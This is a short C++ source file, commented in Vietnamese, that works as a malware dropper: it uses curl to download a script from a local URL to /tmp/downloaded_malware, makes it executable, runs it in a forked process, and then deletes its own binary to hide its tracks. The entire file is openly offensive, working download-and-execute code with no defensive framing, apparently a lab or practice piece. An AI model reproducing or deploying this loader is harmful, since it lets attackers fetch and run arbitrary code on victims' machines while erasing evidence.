#include <iostream>
#include <fstream>
#include <unistd.h>
#include <sys/wait.h>
#include <cstdlib>
#include <sys/stat.h>
void selfDelete(const std::string& filePath) {
    // Lệnh bash để tự xóa bản thân
    std::string deleteCommand = "rm -f \"" + filePath + "\"";
    system(deleteCommand.c_str());
}

void executeDownloadedFile(const std::string& filePath) {
    pid_t pid = fork(); // Tạo process mới
    if (pid == 0) {
    	chmod("/tmp/downloaded_malware", 0755);
        // Process con: Thực thi tệp tải xuống
        //execl(filePath.c_str(), filePath.c_str(), (char*)NULL);
        system("/tmp/downloaded_malware");
        //std::cerr << "Failed to execute file: " << filePath << std::endl;
        //exit(1); // Thoát nếu lỗi
    } else if (pid > 0) {
        // Process cha: Chờ process con hoàn thành
        waitpid(pid, NULL, 0);
    } else {
        std::cerr << "Failed to fork process." << std::endl;
    }
}

bool downloadFile(const std::string& url, const std::string& outputPath) {
    // Sử dụng lệnh curl để tải file
    std::string command = "curl -s -o \"" + outputPath + "\" \"" + url + "\"";
    int result = system(command.c_str());
    return result == 0;
}

int main() {
    const std::string downloadURL = "http://127.0.0.1:8000/ping.sh"; 
    const std::string downloadedFile = "/tmp/downloaded_malware";

    char selfPath[1024];
    ssize_t len = readlink("/proc/self/exe", selfPath, sizeof(selfPath) - 1);
    if (len == -1) {
        std::cerr << "Failed to get current executable path." << std::endl;
        return 1;
    }
    selfPath[len] = '\0'; // Null-terminate đường dẫn

    // Tải file từ URL
    if (downloadFile(downloadURL, downloadedFile)) {
        std::cout << "File downloaded to: " << downloadedFile << std::endl;

        // Thực thi file đã tải xuống
        executeDownloadedFile(downloadedFile);

        // Tự xóa bản thân
        selfDelete(selfPath);
    } else {
        std::cerr << "Failed to download file from: " << downloadURL << std::endl;
        return 1;
    }

    return 0;
}

